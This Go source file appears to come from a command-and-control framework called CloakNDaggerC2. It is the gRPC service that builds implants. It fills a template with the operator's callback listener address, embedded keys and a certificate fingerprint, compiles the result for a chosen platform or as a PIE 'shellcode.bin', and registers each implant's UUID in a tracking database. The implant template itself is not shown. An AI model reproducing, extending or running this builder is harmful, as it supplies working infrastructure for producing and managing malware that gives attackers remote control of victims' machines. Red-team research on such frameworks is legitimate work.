// Original code from https://levelup.gitconnected.com/writing-a-code-generator-in-go-420e69151ab1
// Prod
// We need to convert this to be a gRPC server
// It will await connections and then run through it's builder routine
// The return will be a response code either 0 or 1
// It will also need to send data to the API

package main

import (
	"context"
	"crypto/sha256"
	"crypto/x509"
	"embed"
	"encoding/pem"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"text/template"
	"time"

	"github.com/google/uuid"

	pb "CloakNDaggerC2/dagger/proto/daggerProto"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/proto"
)

func StrH(s string) uint32 {
	var h uint32
	for _, c := range s {
		h = (h << 5) + uint32(c)
	}
	return h
}

var (
	//go:embed Builder/templates/*.tmpl
	rootFs embed.FS
)

// Struct for saving imp to db
type ImpUpdate struct {
	UUID        string
	Whoami      string
	Signature   string
	Retrieved   int32
	Command     string
	LastCheckIn string
	Result      string
	GotIt       int32
}

type ImplantStruct struct {
	platform         string
	architecture     string
	name             string
	listener_address string
}

type appValues struct {
	CallBack    string
	AppName     string
	UUID        string
	Pubkey      string
	ServerKey   string
	Fingerprint uint32
}

func calculatePublicKeyHash(publicKeyPEM []byte) (string, error) {
	// Decode the PEM-encoded public key
	block, _ := pem.Decode(publicKeyPEM)
	if block == nil {
		return "", fmt.Errorf("failed to decode PEM block containing public key")
	}

	// Parse the public key
	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return "", fmt.Errorf("failed to parse certificate: %v", err)
	}

	// Calculate the SHA-256 hash of the raw public key bytes
	hash := sha256.Sum256(cert.RawSubjectPublicKeyInfo)

	// Return the hex-encoded hash as a string
	return fmt.Sprintf("%x", hash), nil
}

type Builder struct {
	pb.UnimplementedBuilderServer
}

func (s *Builder) StartBuilding(ctx context.Context, in *pb.BuildRoutine) (*pb.ReponseCode, error) {
	// Generate and format the UUID
	uuidWithHyphen := uuid.New()
	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)

	// Initialize the values struct
	values := appValues{}

	// Get the data we want to use
	ImplantInfo := &pb.BuildRoutine{
		Platform:        in.GetPlatform(),
		Architecture:    in.GetArchitecture(),
		Name:            in.GetName(),
		ListenerAddress: in.GetListenerAddress(),
	}

	data, err := proto.Marshal(ImplantInfo)
	if err != nil {
		ResponseCode := &pb.ReponseCode{
			Code: 1,
		}
		log.Printf("error marshalling data %e", err)
		return ResponseCode, err
	}

	unmarshaled_data := pb.BuildRoutine{}
	proto.Unmarshal(data, &unmarshaled_data)
	pubPEM, err := os.ReadFile("global.pub.pem")
	if err != nil {
		ResponseCode := &pb.ReponseCode{
			Code: 1,
		}
		log.Printf("error reading global pem file, did you not update it here? %e", err)
		return ResponseCode, err
	}

	string_pem := string(pubPEM)
	string_pem_no_newLines := strings.Replace(string_pem, "\n", "", -1)
	// Here we need to trim the start and end from the string
	string_pem_no_newLines = string_pem_no_newLines[:len(string_pem_no_newLines)-24]
	string_pem_no_newLines = string_pem_no_newLines[26:]
	certPEM, err := os.ReadFile("server.crt")

	// I'm banging my head against a wall trying to trim the fingerprint in golang
	// let's do it in bash
	out, err := exec.Command("openssl", "x509", "-in", "server.crt", "-fingerprint", "-sha256").Output()
	if err != nil {
		ResponseCode := &pb.ReponseCode{
			Code: 1,
		}
		log.Printf("error reading server fingerprint %e", err)
		return ResponseCode, err
	}

	// we've now got the output, so let's trim to the first line in Go
	outstr := string(out)
	lines := strings.Split(outstr, "\n")
	firstLine := lines[0]
	parts := strings.SplitAfterN(firstLine, "=", 2)
	res := parts[1]
	res = strings.ReplaceAll(res, ":", "")
	res = strings.ToLower(res)
	h1 := StrH(res)
	values.Fingerprint = h1

	string_cert := string(certPEM)
	//hash, _ := calculatePublicKeyHash(certPEM)
	string_cert_no_newLines := strings.Replace(string_cert, "\n", "", -1)
	//Here we need to trim the start and end from the string
	string_cert_no_newLines = string_cert_no_newLines[:len(string_cert_no_newLines)-25]
	string_cert_no_newLines = string_cert_no_newLines[27:]

	values.CallBack = in.ListenerAddress
	values.AppName = in.Name
	values.UUID = uuid
	values.Pubkey = string_pem_no_newLines
	values.ServerKey = string_cert_no_newLines

	// Get the current working dir
	mydir, _ := os.Getwd()
	rootFsMapping := map[string]string{
		"dagger.go.tmpl": mydir + "/Builder/templates/" + values.AppName + ".go",
	}

	fmt.Printf("Template mapped \n")
	var (
		fp        *os.File
		templates *template.Template
	)
	/*
	 * Process templates
	 */
	if templates, err = template.ParseFS(rootFs, "Builder/templates/*.tmpl"); err != nil {
		if err != nil {
			ResponseCode := &pb.ReponseCode{
				Code: 1,
			}
			log.Printf("error on template parsing %e", err)
			return ResponseCode, err
		}
	}

	// Check if the template exists
	for templateName, outputPath := range rootFsMapping {
		if fp, err = os.Create(outputPath); err != nil {
			ResponseCode := &pb.ReponseCode{
				Code: 1,
			}
			log.Printf("error on output path %e", err)
			return ResponseCode, err
		}

		defer fp.Close()

		if err = templates.ExecuteTemplate(fp, templateName, values); err != nil {
			ResponseCode := &pb.ReponseCode{
				Code: 1,
			}
			log.Printf("%e", err)
			return ResponseCode, err
		}
	}
	fmt.Printf("Template executed \n")
	switch in.GetArchitecture() {
	case "pie":
		fmt.Printf(" Generating PIE \n")
		appNamePath := "Builder/templates/" + values.AppName + ".go"
		setEnvVarExec := exec.Command("go", "build", "-buildmode", "pie", "-o", "shellcode.bin", appNamePath)
		out, err = setEnvVarExec.Output()
		if err != nil {
			ResponseCode := &pb.ReponseCode{
				Code: 1,
			}
			log.Printf("%e", err)
			return ResponseCode, err
		}
		ResponseCode := &pb.ReponseCode{
			Code: 0,
		}
		return ResponseCode, err

	default:
		// We set the app name and full path here for use later
		appNamePath := "Builder/templates/" + values.AppName + ".go"
		// we set these as global compile options
		os.Setenv("GOOS", in.GetPlatform())
		os.Setenv("GOARCH", in.GetArchitecture())
		fmt.Printf("Set env variables \n")

		// after setting environment variables, we compile using go build and the path to the file
		setEnvVarExec := exec.Command("go", "build", appNamePath)
		out, err = setEnvVarExec.Output()
		if err != nil {
			ResponseCode := &pb.ReponseCode{
				Code: 1,
			}
			log.Printf("%e", err)
			return ResponseCode, err
		}
		ResponseCode := &pb.ReponseCode{
			Code: 0,
		}

		conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
		if err != nil {
			log.Fatalf("did not connect : %v", err)
		}

		defer conn.Close()

		c := pb.NewUpdateRecordClient(conn)

		ctx, cancel := context.WithTimeout(context.Background(), time.Second)

		defer cancel()

		data := ImpUpdate{
			UUID: values.UUID, Whoami: "", Signature: "", Retrieved: 0, Command: "", LastCheckIn: "", Result: "", GotIt: 0,
		}

		res, err := c.SendUpdate(ctx, &pb.UpdateObject{UUID: data.UUID, Whoami: data.Whoami, Signature: data.Signature,
			Retrieved: data.Retrieved, Command: data.Command, LastCheckIn: data.LastCheckIn, Result: data.Result,
			GotIt: data.GotIt})

		if err != nil {
			log.Fatalf("could not save implant: %v", err)
			ResponseCode = &pb.ReponseCode{
				Code: 1,
			}
		}
		if res.GetCode() != 0 {
			ResponseCode = &pb.ReponseCode{
				Code: 1,
			}
		}
		ResponseCode = &pb.ReponseCode{
			Code: 0,
		}

		fmt.Printf("UUID %s successfully added", uuid)
		return ResponseCode, err
	}

}
